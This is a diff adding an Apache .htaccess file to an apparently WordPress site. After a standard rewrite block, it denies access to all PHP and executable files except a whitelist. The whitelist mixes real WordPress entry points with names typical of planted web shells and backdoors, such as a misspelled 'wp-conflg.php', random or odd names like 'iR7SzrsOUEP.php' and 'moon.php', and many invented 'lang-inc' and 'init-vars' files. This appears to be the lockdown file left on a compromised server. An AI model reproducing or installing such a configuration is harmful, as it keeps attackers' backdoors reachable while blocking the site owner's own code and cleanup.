@@ -1,0 +1,16 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|wp-login.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-add.php|install.php|wp-add.php|install.php|lang-widgets-media.php|lang.widgets-api.php|dist-walker-tokens.php|lang-rest-locale.php|class-inc-compat.php|init-vars-query.php|lang.inc-meta.php|license.php|moon.php|dist.vars-api.php|lang.vars-style.php|dist-load-compat.php|init.vars-meta.php|lang-inc-locale.php|lang-inc-rss.php|config.load-api.php|init-load-loader.php|init.vars-sitemaps.php|class-core-style.php|config.walker-http.php|config-widgets-locale.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
